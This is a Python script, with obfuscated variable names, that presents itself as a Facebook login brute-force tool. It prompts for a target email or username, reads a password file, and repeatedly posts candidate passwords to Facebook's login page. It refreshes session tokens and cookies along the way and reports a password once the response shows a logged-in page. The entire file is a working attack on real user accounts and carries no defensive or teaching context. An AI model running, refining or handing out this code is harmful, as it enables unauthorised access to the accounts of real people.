import os .path #line:1
import requests #line:2
from bs4 import BeautifulSoup #line:3
import sys #line:4
if sys .version_info [0 ]!=3 :#line:6
    print ('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')#line:8
    sys .exit ()#line:9
print ('''--------------------------------------
	Trhacknon bruteforce tool
--------------------------------------
			''')#line:13
PASSWORD_FILE ="passwords.txt"#line:14
MIN_PASSWORD_LENGTH =6 #line:15
POST_URL ='https://www.facebook.com/login.php'#line:16
HEADERS ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',}#line:19
PAYLOAD ={}#line:20
COOKIES ={}#line:21
def create_form ():#line:24
    OOOOO0O00O00O000O =dict ()#line:25
    O0O0OO00000OO00OO ={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}#line:26
    OOOO0000OO0OO0O0O =requests .get (POST_URL ,headers =HEADERS )#line:28
    for OO00O00O0OOOO00O0 in OOOO0000OO0OO0O0O .cookies :#line:29
        O0O0OO00000OO00OO [OO00O00O0OOOO00O0 .name ]=OO00O00O0OOOO00O0 .value #line:30
    OOOO0000OO0OO0O0O =BeautifulSoup (OOOO0000OO0OO0O0O .text ,'html.parser').form #line:31
    if OOOO0000OO0OO0O0O .input ['name']=='lsd':#line:32
        OOOOO0O00O00O000O ['lsd']=OOOO0000OO0OO0O0O .input ['value']#line:33
    return OOOOO0O00O00O000O ,O0O0OO00000OO00OO #line:34
def is_this_a_password (O00O00O0O0000OOO0 ,OO0OO0O00O000O000 ,OOO0O0OOOOOO00O0O ):#line:37
    global PAYLOAD ,COOKIES #line:38
    if OO0OO0O00O000O000 %10 ==0 :#line:39
        PAYLOAD ,COOKIES =create_form ()#line:40
        PAYLOAD ['email']=O00O00O0O0000OOO0 #line:41
    PAYLOAD ['pass']=OOO0O0OOOOOO00O0O #line:42
    OO00O0000OO0O0O0O =requests .post (POST_URL ,data =PAYLOAD ,cookies =COOKIES ,headers =HEADERS )#line:43
    if 'Find Friends'in OO00O0000OO0O0O0O .text or 'security code'in OO00O0000OO0O0O0O .text or 'Two-factor authentication'in OO00O0000OO0O0O0O .text or "Log Out"in OO00O0000OO0O0O0O .text :#line:44
        open ('temp','w').write (str (OO00O0000OO0O0O0O .content ))#line:45
        print ('\npassword found is: ',OOO0O0OOOOOO00O0O )#line:46
        return True #line:47
    return False #line:48
if __name__ =="__main__":#line:51
    print ('\n---------- Welcome To Facebook BruteForce ----------\n')#line:52
    if not os .path .isfile (PASSWORD_FILE ):#line:53
        print ("Password file is not exist: ",PASSWORD_FILE )#line:54
        sys .exit (0 )#line:55
    password_data =open (PASSWORD_FILE ,'r').read ().split ("\n")#line:56
    print ("Password file selected: ",PASSWORD_FILE )#line:57
    email =input ('Enter Email/Username to target: ').strip ()#line:58
    for index ,password in zip (range (password_data .__len__ ()),password_data ):#line:59
        password =password .strip ()#line:60
        if len (password )<MIN_PASSWORD_LENGTH :#line:61
            continue #line:62
        print ("Trying password [",index ,"]: ",password )#line:63
        if is_this_a_password (email ,index ,password ):#line:64
            break #line:65
